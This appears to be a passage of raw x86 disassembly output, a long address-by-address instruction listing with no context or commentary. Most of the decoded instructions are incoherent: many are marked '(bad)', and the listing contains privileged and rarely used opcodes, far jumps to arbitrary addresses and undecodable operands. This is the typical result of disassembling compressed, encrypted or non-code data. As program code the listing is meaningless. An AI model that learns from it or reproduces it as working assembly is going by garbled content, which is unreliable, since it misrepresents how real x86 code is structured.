  410b46:	mov    cl,0x8b
  410b48:	outs   dx,BYTE PTR ds:[esi]
  410b49:	popa   
  410b4a:	xor    ecx,DWORD PTR [ecx]
  410b4c:	retf   
  410b4d:	inc    ebx
  410b4e:	inc    esi
  410b4f:	ret    0xfee2
  410b52:	jle    0x410ae7
  410b54:	pop    esp
  410b55:	push   ds
  410b56:	jae    0x410bb8
  410b58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b59:	(bad)  
  410b5a:	cmp    eax,0xb2d8829c
  410b5f:	ffree  st(5)
  410b61:	xchg   eax,edi
  410b63:	jg     0x410b01
  410b65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b66:	lds    esi,FWORD PTR [ebx]
  410b68:	sub    al,0xca
  410b6a:	popf   
  410b6b:	test   BYTE PTR [ebx+0x31],cl
  410b6e:	test   DWORD PTR ss:[ecx],0x81176ce4
  410b75:	or     eax,0x3aed9634
  410b7a:	fwait
  410b7b:	inc    eax
  410b7c:	cdq    
  410b7d:	fild   DWORD PTR [eax+0x3eebe4cd]
  410b83:	mov    ds:0xde4e779,eax
  410b88:	or     bh,BYTE PTR [edx-0x60]
  410b8b:	mov    ebx,0x920322b2
  410b90:	sbb    ebp,ecx
  410b92:	int3   
  410b93:	pop    edi
  410b94:	inc    eax
  410b95:	xor    dh,ah
  410b97:	sub    DWORD PTR [esi+0x7e7ac973],ebp
  410b9d:	xchg   edi,eax
  410b9e:	sub    DWORD PTR [eax-0x12],esp
  410ba1:	push   esp
  410ba2:	and    eax,0x46b48e4e
  410ba7:	aas    
  410ba8:	xchg   BYTE PTR [edi-0x32793131],bh
  410bae:	mov    esi,0xb30a8137
  410bb3:	pop    esp
  410bb4:	dec    esp
  410bb5:	rcpps  xmm4,XMMWORD PTR [edx-0x6a]
  410bb9:	mov    ds:0x278fe866,al
  410bbe:	mov    ds:0x64480c03,eax
  410bc3:	jmp    0x13cccd1d
  410bc8:	scas   al,BYTE PTR es:[edi]
  410bc9:	mov    ebp,0x108d440
  410bce:	daa    
  410bcf:	int3   
  410bd0:	jne    0x410be2
  410bd2:	test   DWORD PTR [eax],0xad179dfc
  410bd8:	popa   
  410bd9:	nop
  410bda:	loopne 0x410c0c
  410bdc:	xchg   esi,eax
  410bdd:	sti    
  410bde:	stc    
  410bdf:	push   eax
  410be0:	dec    eax
  410be1:	inc    ebx
  410be2:	stos   BYTE PTR es:[edi],al
  410be3:	addr16 (bad) 
  410be5:	cmp    eax,0xe54fff4c
  410bea:	cdq    
  410beb:	lock stos BYTE PTR es:[edi],al
  410bed:	push   ebp
  410bee:	mov    DWORD PTR [edx],0xe5ae6efa
  410bf4:	hlt    
  410bf5:	icebp  
  410bf6:	jl     0x410bb9
  410bf8:	dec    edi
  410bf9:	out    dx,al
  410bfa:	xor    BYTE PTR ds:0xf33a2be2,al
  410c00:	xchg   esp,eax
  410c01:	rcl    BYTE PTR [eax+0x1d],cl
  410c04:	fidivr DWORD PTR [ecx+edx*4+0x26]
  410c08:	xor    bh,bh
  410c0a:	sub    eax,0x61ec804
  410c0f:	dec    edx
  410c10:	les    edx,FWORD PTR [ecx+0x5]
  410c13:	push   ebp
  410c14:	xchg   ebx,eax
  410c15:	mov    al,ds:0x97dea907
  410c1a:	mov    ds:0x2b830d29,al
  410c1f:	cmp    BYTE PTR [ebx+0x51de3dd9],0x54
  410c26:	and    dh,BYTE PTR [edx+0x10]
  410c29:	jle    0x410c48
  410c2b:	clc    
  410c2c:	outs   dx,DWORD PTR ds:[esi]
  410c2d:	pop    eax
  410c2e:	inc    esp
  410c2f:	adc    eax,0xb9d7243d
  410c34:	jl     0x410bbb
  410c36:	cmc    
  410c37:	sub    BYTE PTR [edi],cl
  410c39:	pushf  
  410c3a:	push   ds
  410c3b:	enter  0x5292,0x9d
  410c3f:	inc    ebx
  410c40:	fistp  QWORD PTR [ebx-0x23586cf2]
  410c46:	pop    es
  410c47:	sti    
  410c48:	(bad)  
  410c49:	pusha  
  410c4a:	push   eax
  410c4b:	sbb    DWORD PTR [ebx+0x5a],ebp
  410c4e:	mov    dh,0xc4
  410c50:	rol    BYTE PTR [esi+0x67aa0177],0x9f
  410c57:	div    DWORD PTR ds:0xf4ce15ac
  410c5d:	push   ss
  410c5e:	push   esp
  410c5f:	dec    ecx
  410c60:	xchg   BYTE PTR [ecx+0x1e],cl
  410c63:	dec    esp
  410c64:	leave  
  410c65:	sti    
  410c66:	jno    0x410cc2
  410c68:	sbb    al,0x14
  410c6a:	jecxz  0x410cb2
  410c6c:	int    0x9b
  410c6e:	jnp    0x410c34
  410c70:	call   0x4296:0x4f2a34e3
  410c77:	pop    ss
  410c78:	add    BYTE PTR [ebp+0x5de4bcec],0x3c
  410c7f:	push   0xf80cb059
  410c84:	loopne 0x410c3a
  410c86:	adc    dh,BYTE PTR [ebp-0x29646b55]
  410c8c:	lods   eax,DWORD PTR ds:[esi]
  410c8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c8e:	dec    ebx
  410c8f:	fisubr WORD PTR [ecx+edx*8+0x7d]
  410c93:	xor    eax,0x8c05a7b5
  410c98:	sbb    bh,BYTE PTR [ebx]
  410c9a:	imul   esi,edi,0x11a575de
  410ca0:	in     eax,0x17
  410ca2:	inc    ecx
  410ca3:	test   al,0x85
  410ca5:	mov    DWORD PTR [eax+0x6373cf99],esp
  410cab:	and    al,0xbe
  410cad:	fs xchg ebp,eax
  410caf:	mov    dl,0xf8
  410cb1:	mov    WORD PTR [eax+0x10],fs
  410cb4:	jg     0x410cff
  410cb6:	test   WORD PTR ds:0x712b797c,si
  410cbd:	mov    ebp,cs
  410cbf:	(bad)  
  410cc0:	jns    0x410d06
  410cc2:	sbb    ecx,eax
  410cc4:	ficom  WORD PTR [eax+0x1f]
  410cc7:	rol    DWORD PTR [eax-0x63],cl
  410cca:	xor    bh,BYTE PTR [edx-0x17]
  410ccd:	add    ah,BYTE PTR [edi-0x68]
  410cd0:	inc    ecx
  410cd1:	test   DWORD PTR [edx],eax
  410cd3:	mov    ah,0x3b
  410cd5:	cli    
  410cd6:	xor    eax,0x9b2fe40
  410cdb:	cwde   
  410cdc:	xchg   ebx,eax
  410cdd:	jae    0x410cce
  410cdf:	inc    eax
  410ce0:	mov    esp,0x5fe0be03
  410ce5:	inc    esp
  410ce6:	in     al,dx
  410ce7:	inc    eax
  410ce8:	xchg   esi,eax
  410ce9:	(bad)  
  410cea:	cmp    ch,ah
  410cec:	ret    
  410ced:	cld    
  410cee:	das    
  410cef:	sub    esp,ecx
  410cf1:	mov    ebp,0x8aeb0f22
  410cf6:	nop
  410cf7:	and    al,0xa0
  410cf9:	bound  edi,QWORD PTR [ecx-0x48]
  410cfc:	sub    BYTE PTR [edx-0x5b],ah
  410cff:	xchg   ecx,eax
  410d00:	inc    esi
  410d01:	jae    0x410d2f
  410d03:	rol    ebx,cl
  410d05:	daa    
  410d06:	cmp    ah,dh
  410d08:	and    DWORD PTR [eax-0x25],esi
  410d0b:	xor    BYTE PTR [eax-0x3a1329f0],0x31
  410d12:	call   DWORD PTR [ecx-0x15031c05]
  410d18:	inc    eax
  410d19:	jl     0x410d6c
  410d1b:	ins    BYTE PTR es:[edi],dx
  410d1c:	leave  
  410d1d:	cdq    
  410d1e:	cmp    esp,0x66
  410d21:	stos   BYTE PTR es:[edi],al
  410d22:	loope  0x410cbb
  410d24:	mov    eax,ds:0xa7114b7c
  410d29:	jp     0x410d2a
  410d2b:	mov    cl,0xa0
  410d2d:	add    DWORD PTR [ebp-0x4f3918dc],eax
  410d33:	call   0x814:0x87e456e5
  410d3a:	in     eax,0xeb
  410d3c:	fs pop esi
  410d3e:	mov    cl,0xeb
  410d40:	adc    BYTE PTR [eax+0x3a6acc6f],0xbb
  410d47:	loope  0x410dad
  410d49:	mov    ebp,0x3899853b
  410d4e:	push   esp
  410d4f:	test   BYTE PTR [ebx*1-0x5a60d300],ch
  410d56:	adc    edx,DWORD PTR [ecx-0x3b]
  410d59:	nop
  410d5a:	nop
  410d5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d5c:	sbb    BYTE PTR [esi-0x7dc15016],bh
  410d62:	xor    eax,0x66100dc8
  410d67:	cmp    al,0xa8
  410d69:	outs   dx,DWORD PTR ds:[esi]
  410d6a:	pop    eax
  410d6b:	bound  edx,QWORD PTR [eax]
  410d6d:	popf   
  410d6e:	cmp    ecx,DWORD PTR [edx]
  410d70:	push   ds
  410d71:	xchg   ebp,eax
  410d72:	jle    0x410d13
  410d74:	sub    DWORD PTR [esi],esi
  410d76:	aad    0x78
  410d78:	inc    esi
  410d79:	frstor ds:0xd1334803
  410d80:	and    esi,ebp
  410d82:	das    
  410d83:	dec    edi
  410d84:	fiadd  DWORD PTR ds:0xdaec5566
  410d8a:	in     al,dx
  410d8b:	pop    ebx
  410d8c:	icebp  
  410d8d:	sbb    ecx,ebp
  410d8f:	mov    cl,0xcf
  410d91:	push   ebp
  410d92:	push   esi
  410d93:	mov    al,0x17
  410d95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d96:	ror    ecx,0x23
  410d99:	lods   al,BYTE PTR ds:[esi]
  410d9a:	sub    BYTE PTR [esi],ch
  410d9c:	sbb    al,0xde
  410d9e:	add    DWORD PTR [ebx-0x1739a028],0x844d8cb7
  410da8:	pushf  
  410da9:	icebp  
  410daa:	push   ss
  410dab:	imul   edi,DWORD PTR ds:0xa763728f,0xe9c121e9
  410db5:	push   esp
  410db6:	stos   DWORD PTR es:[edi],eax
  410db7:	mov    BYTE PTR ds:0x219601db,bh
  410dbd:	mov    ebx,0x675a72b0
  410dc2:	ins    BYTE PTR es:[edi],dx
  410dc3:	cmp    DWORD PTR [edi*2+0x4d15db97],ebp
  410dca:	adc    bh,BYTE PTR [edx-0x75a85432]
  410dd0:	fsub   DWORD PTR gs:0xfa8d7900
  410dd7:	cli    
  410dd8:	sub    al,0x79
  410dda:	hlt    
  410ddb:	cld    
  410ddc:	arpl   WORD PTR [ebx],bx
  410dde:	mov    ah,dh
  410de0:	dec    esi
  410de1:	xchg   edx,eax
  410de2:	loop   0x410dab
  410de4:	mov    cl,0xcb
  410de6:	mov    bl,0x89
  410de8:	xor    BYTE PTR [esi],al
  410dea:	stc    
  410deb:	popf   
  410dec:	out    dx,al
  410ded:	jb     0x410dbf
  410def:	daa    
  410df0:	scas   al,BYTE PTR es:[edi]
  410df1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410df2:	cdq    
  410df3:	hlt    
  410df4:	clc    
  410df5:	add    eax,0xeb99825e
  410dfa:	mov    BYTE PTR [edx],bl
  410dfc:	nop
  410dfd:	idiv   DWORD PTR [eax+0x17]
  410e00:	push   cs
  410e01:	cmp    edi,eax
  410e03:	addr16 inc eax
  410e05:	and    ebx,DWORD PTR [ebx]
  410e07:	mov    DWORD PTR [ebx+edx*2+0x3f],edi
  410e0b:	cmp    al,BYTE PTR [edx-0x5]
  410e0e:	enter  0xee65,0x88
  410e12:	adc    eax,0xb8eb50cf
  410e17:	adc    al,0x44
  410e19:	js     0x410e3d
  410e1b:	dec    esp
  410e1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e1d:	cdq    
  410e1e:	xlat   BYTE PTR ds:[ebx]
  410e1f:	jmp    0x9094:0xdb105853
  410e26:	out    0x80,eax
  410e28:	in     eax,dx
  410e29:	imul   BYTE PTR [ebp-0x79]
  410e2c:	inc    ecx
  410e2d:	mov    ebx,0xd5e0e7bd
  410e32:	inc    ebp
  410e33:	mov    bh,0xa8
  410e35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e36:	ret    
  410e37:	inc    ebx
  410e38:	repnz clc 
  410e3a:	add    al,0x30
  410e3c:	mov    edi,0xd6499be
  410e41:	sbb    DWORD PTR [esi-0x4cf073dc],esi
  410e47:	stos   DWORD PTR es:[edi],eax
  410e48:	push   cs
  410e49:	icebp  
  410e4a:	loope  0x410eab
  410e4c:	cdq    
  410e4d:	pop    ss
  410e4e:	and    BYTE PTR ds:0xc23dd48a,ch
  410e54:	cli    
  410e55:	(bad)  
  410e56:	lods   eax,DWORD PTR ds:[esi]
  410e57:	popf   
  410e58:	fcomp  DWORD PTR [edi]
  410e5a:	and    al,0xbc
  410e5c:	push   edi
  410e5d:	push   ds
  410e5e:	dec    BYTE PTR [eax]
  410e60:	das    
  410e61:	mov    ds:0xdbbe95cf,al
  410e66:	sbb    BYTE PTR [ecx+0x35],ch
  410e69:	popa   
  410e6a:	lea    ebp,[ebx-0x22]
  410e6d:	and    cl,BYTE PTR [ecx+0x16]
  410e70:	inc    edi
  410e71:	stos   BYTE PTR es:[edi],al
  410e72:	ds cmp ah,al
  410e75:	or     al,0x66
  410e77:	in     eax,0xb
  410e79:	aaa    
  410e7a:	or     BYTE PTR [esi-0x4b],ch
  410e7d:	cs popf 
  410e7f:	dec    esi
  410e80:	jecxz  0x410ebe
  410e82:	push   0xc8cd83be
  410e87:	or     dl,BYTE PTR [ebx]
  410e89:	dec    ecx
  410e8a:	xchg   DWORD PTR [esi+eiz*1],esi
  410e8d:	inc    esi
  410e8e:	pop    eax
  410e8f:	imul   bl
  410e91:	ja     0x410ef4
  410e93:	sti    
  410e94:	loopne 0x410e85
  410e96:	in     eax,dx
  410e97:	das    
  410e98:	mov    esi,0x1186c593
  410e9d:	xchg   esp,eax
  410e9e:	imul   esi,DWORD PTR [eax-0x8e00d17],0x43
  410ea5:	jle    0x410e97
  410ea7:	pop    esp
  410ea8:	cmp    eax,0x2de148a0
  410ead:	sti    
  410eae:	xor    eax,0x19a52741
  410eb3:	jnp    0x410e36
  410eb5:	pop    ss
  410eb6:	pusha  
  410eb7:	dec    ebp
  410eb8:	sbb    ah,BYTE PTR [ebx]
  410eba:	fimul  DWORD PTR [ebx]
  410ebc:	dec    esi
  410ebd:	sbb    al,0xdf
  410ebf:	cmp    eax,DWORD PTR [edx-0x76]
  410ec2:	adc    ah,BYTE PTR [esi+eiz*4-0xf]
  410ec6:	dec    ecx
  410ec7:	push   0x87e25849
  410ecc:	retf   0x58e
  410ecf:	sbb    BYTE PTR [edi-0x2013c6c],0xbd
  410ed6:	push   ss
  410ed7:	aas    
  410ed8:	hlt    
  410ed9:	pop    es
  410eda:	shl    BYTE PTR [eax-0x6ecf005a],0xec
  410ee1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ee2:	cmp    ecx,edx
  410ee4:	cmc    
  410ee5:	jle    0x410ea1
  410ee7:	inc    esp
  410ee8:	mul    BYTE PTR [ecx]
  410eea:	jae    0x410f43
  410eec:	std    
  410eed:	rsm    
  410eef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ef0:	stc    
  410ef1:	jae    0x410f4d
  410ef3:	mov    ds:0xd924cbf6,al
  410ef8:	retf   
  410ef9:	int3   
  410efa:	pop    ss
  410efb:	out    dx,eax
  410efc:	inc    ebx
  410efd:	inc    ecx
  410efe:	lods   al,BYTE PTR ds:[esi]
  410eff:	jns    0x410f1d
  410f01:	push   eax
  410f02:	jnp    0x410f11
  410f04:	in     eax,0x1d
  410f06:	or     DWORD PTR [ebx-0x21e6ecc9],edx
  410f0c:	adc    eax,0xc30c0567
  410f11:	sbb    bh,BYTE PTR [eax+0x54]
  410f14:	cmp    al,0x7
  410f16:	mov    ah,0x51
  410f18:	ins    DWORD PTR es:[edi],dx
  410f19:	fs in  eax,0xf1
  410f1c:	jo     0x410f1e
  410f1e:	and    al,0xc6
  410f20:	scas   eax,DWORD PTR es:[edi]
  410f21:	rcl    DWORD PTR [eax-0x2cb2e74],1
  410f27:	lods   al,BYTE PTR ds:[esi]
  410f28:	dec    ecx
  410f29:	jns    0x410eee
  410f2b:	(bad)  [edx]
  410f2d:	mov    eax,0xd480dfd6
  410f32:	jl     0x410f6d
  410f34:	jb     0x410ef9
  410f36:	into   
  410f37:	mov    cl,0x1d
  410f39:	cmp    BYTE PTR [ecx],ah
  410f3b:	bound  ebp,QWORD PTR [esi+eax*2-0x21]
  410f3f:	test   eax,0x8f2e8235
  410f44:	clc    
  410f45:	pop    ebx
  410f46:	add    cl,BYTE PTR [ebx*1+0x376508bb]
  410f4d:	push   cs
  410f4e:	jge    0x410f49
  410f50:	sbb    DWORD PTR [esi+0x28],ecx
  410f53:	dec    edi
  410f54:	sbb    eax,0x79ac0dc9
  410f59:	sbb    al,0xa6
  410f5b:	xor    BYTE PTR [edi],dl
  410f5d:	fmul   DWORD PTR [ebp+0x2417f31c]
  410f63:	fadd   st(6),st
  410f65:	add    al,BYTE PTR [edx]
  410f67:	aaa    
  410f68:	pop    ss
  410f69:	loope  0x410f4b
  410f6b:	(bad)
  410f6f:	xor    al,0xb8
  410f71:	rcr    BYTE PTR [esi],1
  410f73:	js     0x410fa7
  410f75:	push   esi
  410f76:	adc    eax,0x6d535688
  410f7b:	pop    ds
  410f7c:	cmp    DWORD PTR [edi-0x1199e560],0xa194181e
  410f86:	xlat   BYTE PTR ds:[ebx]
  410f87:	fld    DWORD PTR [edx]
  410f89:	inc    eax
  410f8a:	mov    WORD PTR [ecx+0x56b70337],cs
  410f90:	leave  
  410f91:	inc    ebx
  410f92:	jge    0x410f5c
  410f94:	into   
  410f95:	mov    ds:0x4bdbed61,eax
  410f9a:	clc    
  410f9b:	push   esi
  410f9c:	mov    esi,0x3dad09b7
  410fa1:	icebp  
  410fa2:	in     eax,0x65
  410fa4:	mov    eax,?
  410fa6:	aaa    
  410fa7:	loopne 0x410f9b
  410fa9:	sub    edi,ebx
  410fab:	fcom   DWORD PTR [edi+0x4b5d34be]
  410fb1:	pushf  
  410fb2:	push   ecx
  410fb3:	adc    eax,0xf338037c
  410fb8:	or     BYTE PTR [esi-0x6a],bl
  410fbb:	inc    eax
  410fbc:	aaa    
  410fbd:	outs   dx,DWORD PTR ds:[esi]
  410fbe:	add    al,0x4f
  410fc0:	inc    eax
  410fc1:	jge    0x410ffe
  410fc3:	jno    0x410f45
  410fc5:	or     al,0xc9
  410fc7:	mov    bh,0xad
  410fc9:	dec    esp
  410fca:	push   0x49
  410fcc:	dec    esi
  410fcd:	fadd   st,st(0)
  410fcf:	mov    dh,0x87
  410fd1:	xlat   BYTE PTR ds:[ebx]
  410fd2:	mov    edx,0xad99b53a
  410fd7:	leave  
  410fd8:	mov    edi,0x597fa269
  410fdd:	icebp  
  410fde:	jno    0x41103d
  410fe0:	pop    ds
  410fe1:	sub    BYTE PTR [ecx+0x22d1aa5b],al
  410fe7:	arpl   WORD PTR ds:0x708e5276,ax
  410fed:	shl    BYTE PTR [edx+0x50592d63],cl
  410ff3:	inc    ecx
  410ff4:	xor    al,0xdc
  410ff6:	cmp    esi,DWORD PTR [edi+eax*4-0x1ebe6823]
  410ffd:	call   0xfb343e61
  411002:	dec    ecx
  411003:	imul   ecx,DWORD PTR [edx-0x5a],0xffffff82
  411007:	push   ecx
  411008:	ins    DWORD PTR es:[edi],dx
  411009:	mov    ah,0x7d
  41100b:	sbb    DWORD PTR [ebx-0x2e4fbe28],edi
  411011:	into   
  411012:	jo     0x410fd3
  411014:	xchg   ecx,eax
  411015:	or     eax,edx
  411017:	jnp    0x410f9f
  411019:	jge    0x41104e
  41101b:	(bad)  
  41101c:	out    0xd7,al
  41101e:	cmp    DWORD PTR [ebx-0x5f],ebp
  411021:	lea    ebp,[eax+edx*1+0x79]
  411025:	pop    ebx
  411026:	arpl   bp,sp
  411028:	(bad)  
  411029:	repz pop edx
  41102b:	or     ah,0x67
  41102e:	int3   
  41102f:	sbb    BYTE PTR [ecx-0x2cdd6732],bl
  411035:	retf   
  411036:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411037:	pop    ebx
  411038:	lea    esi,[edx+edi*4-0x1667c4f7]
  41103f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411040:	add    DWORD PTR [ebp+0x12],eax
  411043:	xor    edi,DWORD PTR [eax-0x3a1275e3]
  411049:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41104a:	icebp  
  41104b:	ja     0x411044
  41104d:	mov    dl,BYTE PTR [ebx+0x29]
  411050:	inc    eax
  411051:	and    ebp,edi
  411053:	imul   ebp,esp,0x64812c4a
  411059:	test   eax,0x56bc8f36
  41105e:	leave  
  41105f:	inc    ebx
  411060:	test   DWORD PTR [esi+0x3c],0xb65b7156
  411067:	and    al,0xb1
  411069:	loope  0x411005
  41106b:	or     eax,DWORD PTR [edx-0x14]
  41106e:	repz pushf 
  411070:	pop    eax
  411071:	mov    bl,0xea
  411073:	adc    bl,BYTE PTR [edx]
  411075:	jo     0x41101e
  411077:	inc    ebp
  411078:	add    BYTE PTR [ebx-0x212985ad],dl
  41107e:	daa    
  41107f:	out    0x39,al
  411081:	test   BYTE PTR [edi],bl
  411083:	jns    0x4110e9
  411085:	popa   
  411086:	mov    eax,ds:0x72e49ab8
  41108b:	dec    edi
  41108c:	std    
  41108d:	mov    cl,0xfe
  41108f:	imul   edi,ebx,0x63
  411092:	pop    ss
  411093:	and    eax,0x60412146
  411098:	jmp    0x42d25541
  41109d:	hlt    
  41109e:	cmp    BYTE PTR [ecx+0x12e43bda],ah
  4110a4:	pop    ss
  4110a5:	pusha  
  4110a6:	xchg   ecx,eax
  4110a7:	ds push 0x56d0f0cd
  4110ad:	out    0x1,al
  4110af:	jecxz  0x4110e9
  4110b1:	in     eax,dx
  4110b2:	addr16 nop
  4110b4:	or     eax,0x11bf54c3
  4110b9:	xor    DWORD PTR [ecx+0x1c7fbd0a],0x97d1c791
  4110c3:	mov    ah,BYTE PTR [eax]
  4110c5:	repz mov ch,0xd8
  4110c8:	adc    esi,DWORD PTR [edx-0x8]
  4110cb:	push   eax
  4110cc:	cld    
  4110cd:	sbb    BYTE PTR [edx+eiz*2],dh
  4110d0:	mov    ch,0x79
  4110d2:	outs   dx,DWORD PTR ds:[esi]
  4110d3:	push   cs
  4110d4:	mov    ebx,0x93ae2402
  4110d9:	dec    edx
  4110da:	push   ss
  4110db:	js     0x4110b0
  4110dd:	inc    ecx
  4110de:	or     al,0xeb
  4110e0:	mov    bl,0x3e
  4110e2:	aaa    
  4110e3:	inc    edi
  4110e4:	pop    edi
  4110e5:	rcl    BYTE PTR [ecx-0x762676f0],0x7e
  4110ec:	cdq    
  4110ed:	ror    DWORD PTR [ebp-0x72],0xc6
  4110f1:	push   eax
  4110f2:	push   esi
  4110f3:	loop   0x411161
  4110f5:	and    ebp,ecx
  4110f7:	sbb    BYTE PTR [ecx+0xdc052f8],al
  4110fd:	cmp    edi,DWORD PTR [edi-0x521527f3]
  411103:	mov    DWORD PTR [ebx],esi
  411105:	std    
  411106:	cmp    DWORD PTR [esi-0x27],0x2529dedb
  41110d:	sub    dh,BYTE PTR [edx+esi*2-0x6a]
  411111:	dec    edx
  411112:	jo     0x41116f
  411114:	mov    ebp,0xaae9f1f3
  411119:	dec    eax
  41111a:	(bad)  
  41111c:	and    BYTE PTR [edx-0x7f],0xb5
  411120:	mov    edi,0x59c526e5
  411125:	add    dh,BYTE PTR [si]
  411128:	fwait
  411129:	rcr    DWORD PTR [edx+0x475d206a],cl
  41112f:	adc    eax,0x3efa813d
  411134:	retf   
  411135:	or     eax,0x310fa849
  41113a:	cmp    eax,ebx
  41113c:	lods   eax,DWORD PTR ds:[esi]
  41113d:	mov    ebx,0xa013f1ee
  411142:	test   eax,0xbe85a297
  411147:	xchg   edx,eax
  411148:	pop    esp
  411149:	mov    al,0x96
  41114b:	or     edx,DWORD PTR [ebp+eiz*2+0x1f5e859c]
  411152:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411153:	ins    BYTE PTR es:[edi],dx
  411154:	adc    ah,BYTE PTR [ebp+esi*8+0x37]
  411158:	mov    al,0xda
  41115a:	or     BYTE PTR fs:[eax-0x1690eb25],al
  411161:	gs dec ecx
  411163:	in     eax,0x8c
  411165:	(bad)  
  411166:	retf   
  411167:	into   
  411168:	test   BYTE PTR [edx+0x7f],ch
  41116b:	or     al,0x36
  41116d:	push   cs
  41116e:	pop    esp
  41116f:	repnz lahf 
  411171:	mov    edi,0xc4b9a86e
  411176:	sbb    BYTE PTR [edi+0x40],bh
  411179:	pop    ss
  41117a:	inc    ebx
  41117b:	les    edi,FWORD PTR [esi+0x4a71e9fc]
  411181:	add    al,0x5f
  411183:	test   al,0xd9
  411185:	push   esi
  411186:	push   edx
  411187:	and    esi,ebx
  411189:	inc    esp
  41118a:	leave  
  41118b:	js     0x41118c
  41118d:	xchg   esi,eax
  41118e:	mov    edx,0x42edb9b9
  411193:	in     al,0x50
  411195:	sbb    eax,0xff98eb91
  41119a:	mov    ?,WORD PTR [edi+0xe63ef33]
  4111a0:	data16 (bad) 
  4111a2:	jle    0x4111f2
  4111a4:	neg    BYTE PTR [eax]
  4111a6:	jge    0x411142
  4111a8:	je     0x4111ed
  4111aa:	loope  0x4111f7
  4111ac:	sahf   
  4111ad:	and    BYTE PTR [ecx+0x6],bl
  4111b0:	frstor [edx-0x18]
  4111b3:	call   0xc564:0x17accdf9
  4111ba:	jl     0x4111c3
  4111bc:	mov    esi,0x143aba16
  4111c1:	lock int3 
  4111c3:	sbb    bl,cl
  4111c5:	rcl    DWORD PTR gs:[esi-0xaf24639],cl
  4111cc:	jmp    0xfb4669f4
  4111d1:	inc    ebx
  4111d2:	adc    DWORD PTR [esi-0x39e58c38],esp
  4111d8:	adc    eax,0x9043f831
  4111dd:	pop    ebp
  4111de:	or     DWORD PTR [esi-0x63],edx
  4111e1:	ror    DWORD PTR ds:0x930825bc,1
  4111e7:	push   cs
  4111e8:	jmp    FWORD PTR [eax]
  4111ea:	jno    0x4111f7
  4111ec:	fdiv   DWORD PTR [eax]
  4111ee:	push   esp
  4111ef:	add    al,0x73
  4111f1:	xchg   DWORD PTR [edi],ebx
  4111f3:	push   ds
  4111f4:	cmc    
  4111f5:	dec    ebx
  4111f6:	mov    dh,0x2f
  4111f8:	jge    0x4111d1
  4111fa:	xchg   ebp,eax
  4111fb:	xchg   ah,bh
  4111fd:	sub    dl,BYTE PTR [ebp+0x63]
  411200:	loope  0x4111ca
  411202:	dec    eax
  411203:	pop    ss
  411204:	adc    al,0xcb
  411206:	xchg   ebp,eax
  411207:	push   ecx
  411208:	rcr    DWORD PTR [ecx],cl
  41120a:	sbb    edi,DWORD PTR [edi+0x69fea455]
  411210:	xorps  xmm6,XMMWORD PTR [eax-0x4bb569a8]
  411217:	xor    BYTE PTR [ebx-0x4167c09c],bh
  41121d:	imul   ecx,edx,0x168d903b
  411223:	sub    DWORD PTR [ecx+0x257dedbc],ecx
  411229:	jg     0x411250
  41122b:	push   ds
  41122c:	add    bl,BYTE PTR [ebx-0x13]
  41122f:	mov    ecx,0xe73bff4a
  411234:	jbe    0x411221
  411236:	aas    
  411237:	mov    edx,DWORD PTR [edx-0x3993787]
  41123d:	or     DWORD PTR [edi+esi*1],esi
  411240:	aad    0x59
  411242:	push   0xca1fbb95
  411247:	mov    eax,0x317751ed
  41124c:	int    0x6b
  41124e:	jmp    0x6d95:0xafe94985
  411255:	mov    cl,0x43
  411257:	(bad)  [esi+0x78548712]
  41125d:	pusha  
  41125e:	cdq    
  41125f:	jo     0x411240
  411261:	inc    esi
  411262:	in     eax,dx
  411263:	inc    ebx
  411264:	or     al,BYTE PTR [ebp+esi*4+0x209255ec]
  41126b:	test   eax,0xe7b5bc2d
  411270:	out    0x7,al
  411272:	pop    ss
  411273:	clc    
  411274:	cmp    DWORD PTR [edx],0x6c
  411277:	dec    esi
  411278:	ror    BYTE PTR [ebx+0x3a],cl
  41127b:	(bad)  
  41127d:	add    edi,DWORD PTR [ebp-0x2af21581]
  411283:	repz dec ebx
  411285:	retf   
  411286:	out    dx,al
  411287:	mov    dh,0xb3
  411289:	inc    esp
  41128a:	mov    gs,WORD PTR [esi+0x9]
  41128d:	or     BYTE PTR [esi-0x2c],0x11
  411291:	inc    eax
  411292:	(bad)  
  411293:	mov    BYTE PTR [ecx+eax*2+0x3a9cf0e6],cl
  41129a:	sub    DWORD PTR [bx+si],edi
  41129d:	or     DWORD PTR [eax-0x51],ecx
  4112a0:	popa   
  4112a1:	xor    eax,0x8f87c9fc
  4112a6:	js     0x41122e
  4112a8:	jge    0x41123a
  4112aa:	imul   BYTE PTR [ebx+0x4fb3013]
  4112b0:	int3   
  4112b1:	loop   0x4112b8
  4112b3:	stos   BYTE PTR es:[edi],al
  4112b4:	adc    ecx,ebp
  4112b6:	cs xchg ebx,eax
  4112b8:	out    0xd3,al
  4112ba:	jne    0x411253
  4112bc:	pop    ecx
  4112bd:	and    ax,0xebf0
  4112c1:	imul   esp,DWORD PTR [ebx+edx*1-0x3e],0xffffffcd
  4112c6:	inc    ecx
  4112c7:	ja     0x411272
  4112c9:	mov    gs,ecx
  4112cb:	std    
  4112cc:	hlt    
  4112cd:	sbb    al,0xfd
  4112cf:	into   
  4112d0:	in     eax,dx
  4112d1:	je     0x411257
  4112d3:	rcl    DWORD PTR [ecx+eax*8],1
  4112d6:	neg    BYTE PTR [edx+0x2b57288e]
  4112dc:	daa    
  4112dd:	mov    ?,WORD PTR [esi]
  4112df:	je     0x411272
  4112e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112e2:	retf   0xa81a
  4112e5:	test   DWORD PTR [ecx+0x546e762],0xba218928
  4112ef:	push   eax
  4112f0:	add    edx,DWORD PTR [edx]
  4112f2:	add    DWORD PTR [edi],edx
  4112f4:	call   0xe61978a5
  4112f9:	jb     0x41134d
  4112fb:	out    dx,al
  4112fc:	and    ebx,DWORD PTR [edi]
  4112fe:	jbe    0x4112c5
